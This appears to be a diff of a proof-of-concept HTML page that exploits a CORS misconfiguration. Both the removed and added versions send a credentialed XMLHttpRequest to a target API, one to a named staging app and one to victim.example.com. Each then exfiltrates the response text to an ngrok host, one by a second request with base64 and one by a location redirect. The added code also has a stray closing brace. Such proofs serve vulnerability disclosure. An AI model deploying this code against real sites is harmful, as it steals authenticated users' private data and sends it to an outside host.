@@ -1,26 +1,15 @@
 <html>
   <body>
     <script>
-      var req = new XMLHttpRequest();
-      var url = "https://app.supersidestaging.com";
+      var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
 
-      req.onload = retrieveKeys;
-
-      req.open('GET', url + "/api/projects/v2/193503/members", true);
-      req.withCredentials = true;
-      req.setRequestHeader("User-Agent", "alwi");
-      req.send();
-
-      function retrieveKeys() {
-        callIt(this.responseText);
-        location = '/log?key=' + this.responseText;
-      }
-
-      function callIt(data) {
-        var req2 = new XMLHttpRequest();
-        req2.setRequestHeader("User-Agent", "QuxXS");
-        req2.open("GET", "https://4778-103-83-159-18.ngrok-free.app" + btoa(data), true);
-        req2.send();
+function reqListener() {
+    location='//0.tcp.ap.ngrok.io:11134/log?key='+this.responseText; 
+};
       }
     </script>
   </body>
